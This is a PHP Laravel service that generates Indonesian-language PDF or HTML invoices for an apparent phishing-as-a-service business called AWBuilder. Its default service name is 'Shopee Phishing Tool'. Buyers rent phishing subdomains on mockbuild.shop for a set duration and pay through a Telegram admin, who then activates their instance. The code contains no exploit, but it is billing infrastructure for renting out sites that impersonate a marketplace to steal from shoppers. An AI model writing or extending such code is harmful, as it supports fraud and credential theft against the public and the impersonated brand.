<?php

namespace App\Services;

use Illuminate\Support\Facades\Log;

/**
 * InvoicePdfService
 *
 * Generates a simple HTML-based PDF invoice for deployment orders.
 * Uses PHP's built-in capabilities via a self-contained HTML page that is
 * converted to PDF using wkhtmltopdf (if available) or falls back to
 * returning the raw HTML for browser-based PDF generation.
 *
 * The invoice is temporarily stored in storage/invoices/ and the path is returned.
 */
class InvoicePdfService
{
    private string $invoiceDir;

    public function __construct()
    {
        $this->invoiceDir = storage_path('invoices');

        if (!is_dir($this->invoiceDir)) {
            mkdir($this->invoiceDir, 0775, true);
        }
    }

    /**
     * Generate a PDF invoice and return the file path.
     *
     * @param array $data {
     *   @var string  lead_reference
     *   @var string  client_slug
     *   @var string  service_name
     *   @var string  duration_label
     *   @var int     price
     *   @var string  url
     *   @var string  expires_at   human-readable date
     *   @var string  created_at   human-readable date
     * }
     * @return string|null Absolute path to generated PDF (or HTML fallback), or null on failure
     */
    public function generate(array $data): ?string
    {
        try {
            $html = $this->buildHtml($data);

            $filename   = 'invoice_' . $data['lead_reference'] . '_' . time() . '.html';
            $outputPath = $this->invoiceDir . '/' . $filename;

            file_put_contents($outputPath, $html);

            // Try wkhtmltopdf if available
            $pdfPath = str_replace('.html', '.pdf', $outputPath);
            if ($this->isWkhtmltopdfAvailable()) {
                $cmd    = ['wkhtmltopdf', '--quiet', '--page-size', 'A4', $outputPath, $pdfPath];
                $result = \Illuminate\Support\Facades\Process::timeout(30)->run($cmd);

                if ($result->successful() && file_exists($pdfPath)) {
                    @unlink($outputPath); // clean up HTML
                    Log::channel('deploy-audit')->info('[InvoicePDF] PDF generated successfully', [
                        'path' => $pdfPath,
                    ]);
                    return $pdfPath;
                }
            }

            // Fall back to HTML file (Telegram will send it as a document)
            Log::channel('deploy-audit')->info('[InvoicePDF] Using HTML fallback (wkhtmltopdf not available)', [
                'path' => $outputPath,
            ]);

            return $outputPath;
        } catch (\Throwable $e) {
            Log::channel('deploy-audit')->error('[InvoicePDF] Generation failed: ' . $e->getMessage());
            return null;
        }
    }

    /**
     * Delete an invoice file after it has been sent.
     */
    public function cleanup(string $path): void
    {
        if (file_exists($path)) {
            @unlink($path);
        }
    }

    private function isWkhtmltopdfAvailable(): bool
    {
        $result = \Illuminate\Support\Facades\Process::timeout(3)->run(['which', 'wkhtmltopdf']);
        return $result->successful() && !empty(trim($result->output()));
    }

    private function buildHtml(array $data): string
    {
        $ref          = htmlspecialchars($data['lead_reference'] ?? 'N/A');
        $slug         = htmlspecialchars($data['client_slug'] ?? 'N/A');
        $service      = htmlspecialchars($data['service_name'] ?? 'Shopee Phishing Tool');
        $duration     = htmlspecialchars($data['duration_label'] ?? '-');
        $url          = htmlspecialchars($data['url'] ?? "https://{$slug}.mockbuild.shop");
        $price        = 'Rp ' . number_format((int) ($data['price'] ?? 0), 0, ',', '.');
        $expiresAt    = htmlspecialchars($data['expires_at'] ?? '-');
        $createdAt    = htmlspecialchars($data['created_at'] ?? now()->format('d M Y H:i'));
        $adminHandle  = '@awbuilderadmin';

        return <<<HTML
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Invoice #{$ref} — AWBuilder</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { font-family: 'Courier New', Courier, monospace; background: #0a0a0a; color: #e5e5e5; padding: 40px 20px; }
  .container { max-width: 600px; margin: 0 auto; background: #111; border: 1px solid #333; padding: 40px; }
  .header { border-bottom: 2px solid #fff; padding-bottom: 20px; margin-bottom: 30px; }
  .logo { font-size: 22px; font-weight: 900; letter-spacing: 3px; text-transform: uppercase; color: #fff; }
  .logo-sub { font-size: 9px; letter-spacing: 5px; color: #555; text-transform: uppercase; margin-top: 2px; }
  .badge { display: inline-block; background: #f97316; color: #000; font-size: 9px; font-weight: 900; letter-spacing: 2px; padding: 2px 8px; margin-top: 6px; text-transform: uppercase; }
  h2 { font-size: 14px; letter-spacing: 3px; text-transform: uppercase; color: #999; margin-bottom: 20px; }
  .ref { font-size: 11px; color: #555; margin-bottom: 30px; }
  table { width: 100%; border-collapse: collapse; margin-bottom: 30px; }
  tr { border-bottom: 1px solid #222; }
  td { padding: 12px 0; font-size: 12px; }
  td:first-child { color: #777; width: 45%; }
  td:last-child { color: #fff; font-weight: bold; text-align: right; }
  .total-row td { padding-top: 16px; font-size: 14px; border-top: 2px solid #fff; border-bottom: none; }
  .total-row td:last-child { color: #f97316; font-size: 18px; }
  .status { display: inline-block; background: #fbbf24; color: #000; font-size: 9px; font-weight: 900; padding: 2px 8px; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 30px; }
  .section-title { font-size: 10px; letter-spacing: 3px; color: #555; text-transform: uppercase; margin-bottom: 12px; border-left: 3px solid #f97316; padding-left: 8px; }
  .steps { list-style: none; }
  .steps li { font-size: 11px; color: #888; padding: 8px 0; border-bottom: 1px solid #1a1a1a; }
  .steps li strong { color: #e5e5e5; }
  .footer { margin-top: 40px; border-top: 1px solid #222; padding-top: 20px; text-align: center; font-size: 9px; color: #444; letter-spacing: 2px; text-transform: uppercase; }
  .url-box { background: #0f0f0f; border: 1px solid #333; padding: 12px; font-size: 11px; color: #f97316; word-break: break-all; text-align: center; margin: 10px 0; }
  .warning { background: #1a0f00; border: 1px solid #f97316; padding: 12px; font-size: 10px; color: #f97316; margin-top: 20px; }
</style>
</head>
<body>
<div class="container">

  <div class="header">
    <div class="logo">AWBuilder</div>
    <div class="logo-sub">Auto Deployment Engine</div>
    <div class="badge">INVOICE PESANAN</div>
  </div>

  <h2>📄 Invoice Pembelian</h2>
  <div class="ref">Nomor Referensi: <strong style="color:#fff">{$ref}</strong></div>
  <div class="status">⏳ Menunggu Pembayaran</div>

  <table>
    <tr>
      <td>Layanan</td>
      <td>{$service}</td>
    </tr>
    <tr>
      <td>Durasi Sewa</td>
      <td>{$duration}</td>
    </tr>
    <tr>
      <td>Subdomain / URL</td>
      <td>{$url}</td>
    </tr>
    <tr>
      <td>Berlaku Hingga</td>
      <td>{$expiresAt}</td>
    </tr>
    <tr>
      <td>Tanggal Pesan</td>
      <td>{$createdAt}</td>
    </tr>
    <tr class="total-row">
      <td>TOTAL BAYAR</td>
      <td>{$price}</td>
    </tr>
  </table>

  <div class="section-title">CARA PEMBAYARAN</div>
  <ul class="steps">
    <li><strong>1.</strong> Scan QRIS atau transfer ke rekening AWBuilder</li>
    <li><strong>2.</strong> Kirim screenshot bukti bayar ke admin Telegram: <strong style="color:#f97316">{$adminHandle}</strong></li>
    <li><strong>3.</strong> Sertakan subdomain Anda di caption: <strong style="color:#f97316">{$slug}</strong></li>
    <li><strong>4.</strong> Sistem akan otomatis mengaktifkan instansi Anda dalam hitungan menit</li>
  </ul>

  <div class="warning">
    ⚠️ Kirimkan bukti bayar langsung ke admin via Telegram. Jangan kirim ke nomor lain.
    Instansi hanya akan aktif setelah pembayaran diverifikasi oleh sistem.
  </div>

  <div class="footer">
    © {$this->year()} AWBuilder — Auto Deployment Engine &nbsp;|&nbsp; {$adminHandle}
  </div>

</div>
</body>
</html>
HTML;
    }

    private function year(): string
    {
        return date('Y');
    }
}
